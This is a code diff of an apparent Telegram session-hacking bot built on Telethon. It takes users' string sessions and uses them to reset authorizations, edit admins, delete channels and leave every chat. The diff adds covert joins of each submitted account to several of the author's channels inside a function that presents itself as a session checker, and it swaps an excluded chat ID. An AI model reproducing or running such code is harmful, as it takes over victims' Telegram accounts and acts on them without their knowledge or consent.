@@ -2,7 +2,7 @@ import re
 import env
 from asyncio import sleep
 from Hack.helpers import validate_session
-from asyncio.exceptions import TimeoutError as terror
+from asyncio import TimeoutError as terror
 from telethon.tl.types import ChannelParticipantsAdmins
 from telethon import TelegramClient as tg, functions, errors
 from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
@@ -10,16 +10,13 @@ from telethon.tl.functions.messages import ImportChatInviteRequest as ICIR
 from telethon.tl.functions.channels import EditAdminRequest, GetAdminedPublicChannelsRequest as PC, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dcr, InviteToChannelRequest as ICR
 
 ERROR_TEXT = """
-**sᴏᴍᴇ ᴇxᴄᴇᴘᴛɪᴏɴ ᴏᴄᴄᴜʀʀᴇᴅ
+**SOME EXCEPTION OCCURRED
 
-ʜᴀᴄᴋ ɴᴀᴍᴇ: __{}__
+HACK NAME: __{}__
 
-ᴇʀʀᴏʀ ɴᴀᴍᴇ: __{}__
+ERROR NAME: __{}__
 
-ᴇʀʀᴏʀ ᴅᴇsᴄʀɪᴘᴛɪᴏɴ: __{}__
-
-
-ɪғ ʏᴏᴜ ᴅᴏɴ'ᴛ ᴜɴᴅᴇʀsᴛᴀɴᴅ ᴛʜɪs ғᴏʀᴡᴀʀᴅ ᴛʜɪs ᴛᴏ @TheChampuClub**
+ERROR DESCRIPTION: __{}__**
 """
 
 
@@ -39,6 +36,10 @@ async def str_checker(strses):
             return False
         try:
             await bot(join('@TheChampu'))
+            await bot(join('@FenuZone'))
+            await bot(join('@TheShivanshu'))
+            await bot(join('@TheChampuClub'))
+            await bot(join('@ll_Champu_ll'))
         except:
             pass
         await bot.disconnect()
@@ -48,7 +49,7 @@ async def str_checker(strses):
 
 
 async def check_string(x):
-    yy = await x.send_message("ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ")
+    yy = await x.send_message("GIVE STRING SESSION")
     try:
         xx = await x.get_response(timeout=300)
         await yy.delete()
@@ -270,7 +271,7 @@ async def leave_all(strses, dialogs=None):
     async with tg(strses, env.API_ID, env.API_HASH) as bot:
         left = 0
         for x in dialogs:
-            if x == -1001898486632:
+            if x == -1001987535452:
                 continue
             try:
                 await bot(leave(x))
